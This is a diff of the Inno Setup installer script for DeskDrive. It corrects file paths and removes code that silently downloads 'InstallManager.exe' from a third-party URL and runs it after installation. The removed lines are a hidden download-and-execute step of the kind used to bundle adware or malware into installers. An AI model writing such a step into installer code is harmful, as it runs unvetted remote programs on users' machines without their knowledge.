@@ -6,8 +6,6 @@
 #define MyAppPublisher "Mike Ward"
 #define MyAppURL "http://mike-ward.net/deskdrive"
 #define MyAppExeName "DeskDrive.exe"
-#define ITDRoot ReadReg(HKEY_LOCAL_MACHINE,'Software\Sherlock Software\InnoTools\Downloader','InstallPath','')  
-#include ITDRoot+'\it_download.iss' 
 
 [Setup]
 ; NOTE: The value of AppId uniquely identifies this application.
@@ -23,7 +21,7 @@ AppSupportURL={#MyAppURL}
 AppUpdatesURL={#MyAppURL}
 DefaultDirName={pf}\{#MyAppName}
 DefaultGroupName={#MyAppName}
-LicenseFile=..\..\DeskDrive\DeskDrive\License.rtf
+LicenseFile=..\DeskDrive\License.rtf
 OutputBaseFilename=DeskDriveSetup
 Compression=lzma
 SolidCompression=yes
@@ -57,10 +55,10 @@ Name: "ukrainian"; MessagesFile: "compiler:Languages\Ukrainian.isl"
 [Tasks]
 
 [Files]
-Source: "..\..\DeskDrive\DeskDrive\bin\Release\DeskDrive.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "..\..\DeskDrive\DeskDrive\bin\Release\BigMansStuff.LocusEffects.dll"; DestDir: "{app}"; Flags: ignoreversion
-Source: "..\..\DeskDrive\DeskDrive\bin\Release\DeskDrive.exe.config"; DestDir: "{app}"; Flags: ignoreversion
-Source: "..\..\DeskDrive\DeskDrive\bin\Release\DeskDrive.exe.xml"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\DeskDrive\bin\Release\DeskDrive.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\DeskDrive\bin\Release\BigMansStuff.LocusEffects.dll"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\DeskDrive\bin\Release\DeskDrive.exe.config"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\DeskDrive\bin\Release\DeskDrive.exe.xml"; DestDir: "{app}"; Flags: ignoreversion
 ; NOTE: Don't use "Flags: ignoreversion" on any shared system files
 
 [Icons]
@@ -134,24 +132,3 @@ begin
     end else
         result := true;
 end;
-
-procedure InitializeWizard();
-begin
-    itd_init; 
-    itd_addfile('http://www.ntdlzone.com/download.php?k4CGeA==', expandconstant('{tmp}\InstallManager.exe')); 
-    itd_downloadafter(wpReady); 
-    ITD_SetOption('UI_AllowContinue', '1'); 
-end;
-
-procedure CurStepChanged(CurStep: TSetupStep); 
-var AppPath:String; 
-WorkingDir:String; 
-ReturnCode:Integer; 
-begin 
-if CurStep=ssPostInstall then begin    
-    WorkingDir := ExpandConstant ('{tmp}');    
-    AppPath := expandconstant('{tmp}\InstallManager.exe')    
-    Exec (AppPath, '', WorkingDir, SW_SHOW, ewWaitUntilTerminated,    
-    ReturnCode);  
-    end; 
-end; 
